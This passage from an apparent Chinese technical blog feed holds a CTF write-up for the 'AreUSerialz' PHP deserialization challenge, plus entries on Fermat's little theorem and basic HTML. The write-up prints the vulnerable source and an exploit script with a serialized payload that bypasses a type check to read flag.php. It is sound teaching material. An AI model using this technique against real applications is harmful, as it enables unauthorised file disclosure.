class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="variable">$res</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((<span class="keyword">string</span>)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid(<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="variable">$obj</span> = unserialize(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到是 <code>php</code> 反序列化，那么我们主要看看析构函数 <code>__destruct</code>，如果成员 <code>$this-&gt;op===&quot;2&quot;</code> 那么让它变成1，<code>$this-&gt;content</code> 变为空字符串，执行 <code>process</code> 函数。那我们看看 <code>$this-&gt;process</code> 函数的具体细节，如果 <code>$this-&gt;op==&quot;2&quot;</code> 那么执行 <code>read</code> 函数，否则执行 <code>write</code> 函数。首先题目开始给我们看到了是有一个 <code>flag.php</code> 文件的，那么我们肯定是要利用这个对象进行读 <code>flag.php</code> 操作的，但是析构函数的时候会如果发现操作为读，则改为写操作。那么这里需要绕过一下，因为析构函数这里是强比较，而 <code>process</code> 函数判断读写操作是弱比较，这里我们反序列化的时候就可以给一个 <code>int</code> 绕过去，让它不会被改变并且可以被判断为是读操作。</p><p>然后我们再来看看外面，可以发现用了一个函数 <code>is_valid</code> 用于过滤非法字符，而我们反序列化如果对象本身带有 <code>private</code> 或者 <code>protected</code> 类型的对象时，一定要用 <code>0</code> 字节来反序列化，不然会失败，但是低版本的 <code>php</code> 对类型不敏感，所以我们直接把成员类型改成 <code>public</code> 然后按照这个方法构造得到的序列化结果就是 <code>payload</code>。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//highlight_file(__FILE__);</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;op = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> serialize(<span class="keyword">$this</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="variable">$res</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((<span class="keyword">string</span>)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">//echo(serialize($this));</span></span><br><span class="line">        <span class="comment">//if($this-&gt;op === &quot;2&quot;)</span></span><br><span class="line">        <span class="comment">//    $this-&gt;op = &quot;1&quot;;</span></span><br><span class="line">        <span class="comment">//$this-&gt;content = &quot;&quot;;</span></span><br><span class="line">        <span class="comment">//$this-&gt;process();</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="comment">//$res=&#x27;O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:1:&quot;r&quot;;&#125;&#x27;;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="/2022/04/28/wdb2020AreUSerialz/1.png" alt="1"></p><p>那么这个 <code>payload</code> 直接打进去就可以再浏览器源代码模式看到读出的 <code>flag</code> 了。</p><p><img src="/2022/04/28/wdb2020AreUSerialz/2.png" alt="2"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> web </category>
          
          <category> php反序列化 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>费马小定理的应用及证明</title>
      <link href="/2022/04/28/femal/"/>
      <url>/2022/04/28/femal/</url>
      
        <content type="html"><![CDATA[<p>小学一波数论</p><span id="more"></span><h2 id="费马小定理"><a href="#费马小定理" class="headerlink" title="费马小定理"></a>费马小定理</h2><p>若 $p$ 为素数，$\gcd(a, p) = 1$，则 $a^{p - 1} \equiv 1 \pmod{p}$。</p><p>另一个形式：对于任意整数 $a$，有 $a^p \equiv a \pmod{p}$。</p><h3 id="证明"><a href="#证明" class="headerlink" title="证明"></a>证明</h3><p>设一个质数为 $p$，我们取一个不为 $p$ 倍数的数 $a$。</p><p>构造一个序列：$A={1,2,3\dots,p-1}$，这个序列有着这样一个性质：</p><p>$$<br>\prod_{i=1}^{n}\space A_i\equiv\prod_{i=1}^{n} (A_i\times a) \pmod p<br>$$</p><p>证明：</p><p>$$<br>\because gcd(A_i,p)=1,gcd(A_i\times a,p)=1<br>$$</p><p>又因为每一个 $A_i\times a \pmod p$ 都是独一无二的，且 $A_i\times a \pmod p &lt; p$</p><p>得证（每一个 $A_i\times a$ 都对应了一个 $A_i$)</p><p>设 $f=(p-1)!$, 则 $f\equiv a\times A_1\times a\times A_2\times a \times A_3 \dots \times  A_{p-1} \pmod p$</p><p>$$<br>a^{p-1}\times f \equiv f \pmod p \     a^{p-1} \equiv 1 \pmod p<br>$$</p><p>证毕。</p><h2 id="欧拉定理"><a href="#欧拉定理" class="headerlink" title="欧拉定理"></a>欧拉定理</h2><p>欧拉定理实际上就是费马小定理的推广，欧拉定理的内容如下。</p><p>若 $\gcd(a, m) = 1$，则 $a^{\varphi(m)} \equiv 1 \pmod{m}$。</p><p>至于这个证明么，有点复杂，不细讲了（实则也不会）。可以说，费马小定理撑起了很多东西，比如我们经常算的逆元，或者是经典非对称加密 <code>RSA</code> 都有用到费马小定理。</p><h2 id="逆元"><a href="#逆元" class="headerlink" title="逆元"></a>逆元</h2><p>这个概念是抽象代数里面的，定义代数中的二元运算 <code>*</code> 和有限集 <code>G</code> ，若 $a*b∈G(a∈G,b∈G)$ 则，群 $&lt;G,*&gt;$ 是一个关系代数。</p><p>代数中，有一个很重要的概念就是幺元 ，幺元是指与任意数进行关系运算结果都等于那个数，比如在加法运算中，0就是幺元，因为0加任何数都等于任何数嘛。在乘法中，1就是幺元，同样1乘任何数也等于任何数。而逆元就是说两个数相互进行关系运算之后得到幺元，那么这两个数就互称为对方的逆元。</p><p>而我们平时算法竞赛研究的代数体系通常是乘法取模运算，它其实跟乘法类似，就多个取模，取模也限定了它集合的有限性。在乘法模运算中，我们不难发现1是幺元。所以若 $b$ 是 $a$ 在模 $m$ 意义下的逆元，则有 $a\times b \equiv 1 \pmod p$。而这个1我们稍微用一下费马小定理，把它变成 $a^{p-1}$，那么整个式子就变成了 $b\equiv a^{p-2}\ (mod\ p)$。我们就能已知其中一个数算出另一个数的逆元了，至于幂运算可以使用快速幂解决，那么我们算一个数的逆元的复杂度就是 $O(log_2p)$ 了。</p>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> 数论 </category>
          
          <category> 费马小定理 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>html语言的学习</title>
      <link href="/2022/04/24/html%E8%AF%AD%E8%A8%80%E7%9A%84%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/04/24/html%E8%AF%AD%E8%A8%80%E7%9A%84%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>来学学 <code>html</code> (超文本标记语言)。</p><p>超文本标记语言)是一种用于创建网页的标准标记语言。</p><span id="more"></span><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>想彻彻底底学一遍 <code>web</code> 安全，先从最基本的 <code>html</code> 开始吧，首先 <code>html</code> 是给浏览器执行的语言，也就是说 <code>html</code> 是在我们本地的，是前端语言，相反 <code>php</code> 就是后端语言了，在服务器执行完得到结果之后以 <code>html</code> 的形式返回给用户，先最基本了解一下 <code>html</code> 有一个清晰的概念。</p><h2 id="html语法"><a href="#html语法" class="headerlink" title="html语法"></a>html语法</h2><p><code>html</code> 语法较为松散，以至于你基本见不到因为 <code>html</code> 报的错（这也就更加考验了我们的代码功底，因为写错了某些东西它不会报错的）。<code>html</code> 说到底它就是由标签(有时候也成为”元素”)和对应的属性组成的，万种语言都有自己的 <code>hello world</code>，同样我们也先写一个 <code>hello world</code>。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            hello world!</span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>我们把它放到我们搭建的网站的根目录，用浏览器访问 <code>127.0.0.1</code> 看看，请注意，写好的 <code>html</code> 文件不要直接打开，养成好习惯，使用<code>http</code> 协议访问它，用 <code>file</code> 协议虽然能访问到，但是当需要执行 <code>php</code> 脚本的时候会出现很多麻烦。</p><p><img src="/2022/04/24/html%E8%AF%AD%E8%A8%80%E7%9A%84%E5%AD%A6%E4%B9%A0/1.png" alt="1"></p><h3 id="标签"><a href="#标签" class="headerlink" title="标签"></a>标签</h3><p>那么我们来细细讲讲标签。</p><p>标签就是由一对尖括号 <code>&lt;&gt;</code>组成的，标签的基本形式就是 <code>&lt;标签名&gt;xxx&lt;/标签名&gt;</code>，可以嵌套其它标签。</p><p>当然也有单身狗标签是自己一个人当一个标签，形如<code>&lt;标签名/&gt;</code> ，不能嵌套其它标签。</p><p>标签可以相互嵌套，在上面这个例子中，不难发现 <code>html</code> 标签内包含 <code>body</code> 标签，<code>body</code> 标签包含 <code>div</code> 标签。我们还可以发现，标签不会直接显示在网页中，但是我们能从 <code>F12</code> 的控制台中看见我们写的 <code>html</code> 代码。</p><p><img src="/2022/04/24/html%E8%AF%AD%E8%A8%80%E7%9A%84%E5%AD%A6%E4%B9%A0/2.png" alt="2"></p><p>标签可以嵌套文字，这些文字会依附标签，并根据标签的特性显示文字。</p><h3 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h3><p>属性会写在开始标签的尖括号内，一般形式为 <code>&lt;标签名 属性名1=属性值1 属性名2=属性值2 ...&gt;</code>。比如现在想玩点花的，我不想显示普通的 <code>hello world</code> ，我想换个颜色，比如红色，我换成如下代码。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">&quot;red&quot;</span>&gt;</span></span><br><span class="line">            hello world!</span><br><span class="line">        <span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>因为 <code>div</code> 标签不支持 <code>color</code> 属性，因此这里换成 <code>font</code> 标签，可以看到达到了我们预期的效果。</p><p><img src="/2022/04/24/html%E8%AF%AD%E8%A8%80%E7%9A%84%E5%AD%A6%E4%B9%A0/3.png" alt="3"></p><p>在这个例子中的 <code>font</code> 标签我们就为他指定了属性，属性名为 <code>color</code>，对应的值为 <code>&quot;red&quot;</code> ，表示了这个标签的内容将显示红色字体。</p><h3 id="常用标签"><a href="#常用标签" class="headerlink" title="常用标签"></a>常用标签</h3><ul><li><code>div</code>：作为布局容器</li><li><code>a</code>标签：用作点击跳转</li><li><code>img</code>：显示图片，单个出现</li><li><code>table,tr,td</code>：表格</li><li><code>ul,ol</code>：列表</li><li><code>h1-h6</code>：1-6级标题</li><li><code>br</code>：换行</li><li><code>input</code>：表单类</li></ul><h4 id="div"><a href="#div" class="headerlink" title="div"></a>div</h4><p>这个暂时先不讲，应该等到后面讲布局的时候会说到</p><h4 id="a"><a href="#a" class="headerlink" title="a"></a>a</h4><p>网页跳转是我们比较熟知的功能了，比如我 <code>google</code> 搜出来很多结果，结果不可能显示整个页面，它会给出一个标题，然后设置超链接跳转到这个页面，<code>a</code> 标签就是专门用来做跳转的，标签包括的内容将全部会被设上超链接跳转到 <code>href</code> 属性指定的链接地址。如果跳转到本站的某个页面，直接从网站根目录开始指定路径即可，如果跳转到外站的话则需要从 <code>http://</code> 开始书写超链接。</p><h5 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://xia0ji233.pro/&quot;</span>&gt;</span></span><br><span class="line">                这是一个超链接</span><br><span class="line">            <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>我们看看效果：</p><p><img src="/2022/04/24/html%E8%AF%AD%E8%A8%80%E7%9A%84%E5%AD%A6%E4%B9%A0/4.png" alt="4"></p><p>可以看到，鼠标悬停在文本的时候会显示超链接链接的地址，点击可以跳转到对应的页面。</p><h4 id="img"><a href="#img" class="headerlink" title="img"></a>img</h4><p>显示图片的标签，单个出现，由 <code>src</code> 属性指定图片路径，如果图片在本站则可以直接从根目录指定路径，引用站外图片则需要书写图片完整的超链接。</p><h5 id="demo-1"><a href="#demo-1" class="headerlink" title="demo"></a>demo</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/1.jpg&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到成功引用图片</p><p><img src="/2022/04/24/html%E8%AF%AD%E8%A8%80%E7%9A%84%E5%AD%A6%E4%B9%A0/5.png" alt="5"></p><p>我们也可以写一个代码来引用站外图片</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://codeforces.org/s/14146/images/codeforces-logo-with-telegram.png&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>成功引用 <code>codeforces</code> 的 <code>logo</code>。</p><p><img src="/2022/04/24/html%E8%AF%AD%E8%A8%80%E7%9A%84%E5%AD%A6%E4%B9%A0/6.png" alt="6"></p><h4 id="tr-td"><a href="#tr-td" class="headerlink" title="tr,td"></a>tr,td</h4><p>这个我也还在摸索，不过经过我自己的测试大概能讲出一二，<code>tr</code> 为一行，然后 <code>td</code> 为一行中的一列标签。 用数据库的术语来说呢，就是：<code>&lt;tr&gt;</code> 标签为一条整记录， <code>&lt;td&gt;</code> 标签为一条记录的其中一个字段的值。</p><p>我们也写一个demo</p><h5 id="demo-2"><a href="#demo-2" class="headerlink" title="demo"></a>demo</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td 